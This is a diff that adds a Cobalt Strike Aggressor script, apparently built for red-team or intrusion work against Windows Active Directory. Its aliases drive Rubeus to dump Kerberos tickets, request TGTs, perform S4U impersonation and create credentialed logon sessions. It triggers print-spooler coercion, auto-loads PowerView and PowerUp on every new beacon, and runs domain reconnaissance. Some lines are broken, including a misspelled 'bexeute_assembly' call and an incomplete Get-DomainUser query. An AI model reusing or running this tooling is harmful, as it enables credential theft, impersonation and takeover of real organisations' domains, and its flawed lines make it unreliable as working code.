@@ -1,0 +1,65 @@
+$RUBEUSLOCATION = "C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe"; # location of Rubeus
+$SHARP = "C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe"; # location of SharpSpoolTrigger
+bind Ctrl+R {
+    show_message("$RUBEUSLOCATION");
+}
+
+alias SharpSpoolTrigger {
+    bexecute_assembly($1, $SHARP, "$2 $3");
+}
+
+alias dump {
+    bexecute_assembly($1, $RUBEUSLOCATION, "dump /nowrap");
+}
+
+alias dumpluid {
+    bexecute_assembly($1, $RUBEUSLOCATION, "dump /luid:$2 /nowrap");
+}
+
+alias triage {
+    bexecute_assembly($1, $RUBEUSLOCATION, "triage"); 
+}
+
+alias asktgt {
+    bexecute_assembly($1, $RUBEUSLOCATION, "asktgt /user:$2 /aes256:$3 /nowrap");
+}
+
+alias CreateNetOnly {
+    bexecute_assembly($1, $RUBEUSLOCATION, "createnetonly /program:$2"); 
+}
+
+alias CreateNetOnlyImpersonate {
+    bexecute_assembly($1, $RUBEUSLOCATION, "createnetonly /program:$2 /domain:$3 /username:$4 /password:$5");
+}
+
+alias s4u {
+    bexeute_assembly($1, $RUBEUSLOCATION, "s4u /impersonateuser:$2 /self /altservice:$3 /user:$4 /ticket:$5 /nowrap");
+}
+
+alias altservice {
+    bexecute_assembly($1, $RUBEUSLOCATION, "s4u /impersonateuser:$2 /msdsspn:$3 /altservice:$4 /user:$5 /ticket:$6 /nowrap");
+}
+
+on beacon_initial {
+   bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
+   bpowershell_import($1, "C:\\Tools\\PowerSploit\\Privesc\\PowerUp.ps1");
+}
+
+alias import-powerview {
+    bpowershell_import($1, "C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1");
+}
+
+alias import-powerup {
+    bpowershell_import($1, "C:\\Tools\\PowerSploit\\Privesc\\PowerUp.ps1");
+}
+
+alias domain-recon {
+    bpowerpick($1, 'Get-Domain');
+    bpowerpick($1, 'Get-DomainController | select Forest, Name, OSVersion | fl');
+    bpowerpick($1, 'Get-ForestDomain');
+    bpowerpick($1, 'Get-DomainPolicyData | select -expand SystemAccess');
+}
+
+alias DomainUserProperties {
+    bpowerpick($1, 'Get-DomainUser -Identity -Properties DisplayName, MemberOf | fl');
+}
